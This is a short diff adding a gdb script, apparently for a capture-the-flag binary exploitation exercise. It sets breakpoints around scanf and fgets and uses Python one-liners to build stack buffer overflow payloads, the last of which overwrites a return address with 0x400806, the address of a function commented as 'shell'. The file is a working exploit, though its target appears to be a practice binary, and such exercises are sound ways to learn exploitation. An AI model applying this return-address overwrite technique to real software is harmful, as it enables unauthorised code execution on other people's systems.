@@ -1,0 +1,15 @@
+# scanf
+#b *0x40089a
+b *0x40089f
+
+# fgets
+b *0x4008b5
+
+# after fgets
+b *0x4008c0
+
+# 0x000000000400806 shell
+#shell python -c 'print "768\n" + "\x00"*512 + "\x00"*22 + "A"*19 + "\n" + "0\n"' > pwn
+#shell python -c 'print "1024\n" + "A"*527 + "B"*8 + "C"*8 + "\n" + "0\n"' > pwn
+shell python -c 'print "1024\n" + "A"*527 + "B"*8 + "\x06\x08\x40\x00\x00\x00\x00\x00" + "\n" + "0\n"' > pwn
+r < pwn
